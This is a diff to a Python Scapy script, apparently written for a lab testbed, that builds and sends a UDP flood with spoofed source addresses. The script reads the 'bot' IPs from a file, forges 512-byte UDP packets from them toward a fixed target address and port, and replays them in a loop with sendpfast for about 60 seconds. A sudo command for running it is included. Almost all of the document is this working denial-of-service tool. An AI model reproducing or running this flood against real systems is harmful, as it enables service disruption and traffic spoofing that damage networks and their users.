@@ -1,76 +1,56 @@
 from scapy.all import *
-import scapy
 import random
 import time
-import sys
 import ipaddress
-import threading
 
 # Scapy UDP Flood (512 bytes) (60 seconds)
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
 BOTFILE = "../bots.txt"
 PACKET_PAYLOAD_SIZE = 512
-NUM_PACKETS = 1000000
+NUM_PACKETS = 10000
 SEND_DURATION = 60
+IFACE = "enp0s3"
 
 def load_bots(filename):
     bot_ips = []
-
     with open(filename, "r") as f:
         for line in f:
             ip = line.strip()
             if ip:
                 ipaddress.ip_address(ip)
                 bot_ips.append(ip)
-
     return bot_ips
 
-def test(packet_list):
-    sendpfast(packet_list, iface="enp3s0", file_cache=True)
-
 def run_udp_flood_attack():
-    """UDP Flood Attack"""
     bot_ips = load_bots(BOTFILE)
-
-    numero_de_pacotes_enviados = 0
-
-    lista_de_pacotes = []
+    packets = []
 
     start_build = time.perf_counter()
-    while True:
+    for _ in range(NUM_PACKETS):
         source_ip = random.choice(bot_ips)
 
-        ip_layer = IP(src=source_ip, dst=TARGET_IP)
+        ip_layer  = IP(src=source_ip, dst=TARGET_IP)
         eth_layer = Ether()
         udp_layer = UDP(sport=RandShort(), dport=TARGET_PORT)
 
-        payload = b'*' * PACKET_PAYLOAD_SIZE
+        payload = b"*" * PACKET_PAYLOAD_SIZE
 
         packet = eth_layer / ip_layer / udp_layer / Raw(load=payload)
-
-        lista_de_pacotes.append(packet)
-        numero_de_pacotes_enviados += 1
-
-        if(numero_de_pacotes_enviados == NUM_PACKETS):
-            break
+        packets.append(packet)
 
     end_build = time.perf_counter()
     build_duration = end_build - start_build
 
     print(f"\nPacket creation completed.")
     print(f"Time to build packets: {build_duration:.4f} seconds")
+    print(f"\nSending packets for {SEND_DURATION - build_duration:.4f} seconds...")
 
-    print(f"\nSending packets for {SEND_DURATION} seconds...")
+    sendpfast(packets, iface=IFACE, file_cache=True, loop=0)
 
-    thread = threading.Thread(target=test(lista_de_pacotes))
-    thread.start()
-
-    time.sleep(SEND_DURATION)
-
-    exit(0)
+    print(f"\nPacket sending finished.")
 
 if __name__ == "__main__":
     run_udp_flood_attack()
 
-# sudo PYTHONPATH=$HOME/scapy python3 scapy_test_udp_512bytes_flood.py
+# timeout -s INT 60 sudo PYTHONPATH=$HOME/scapy python3 scapy_test_udp_512bytes_flood.py
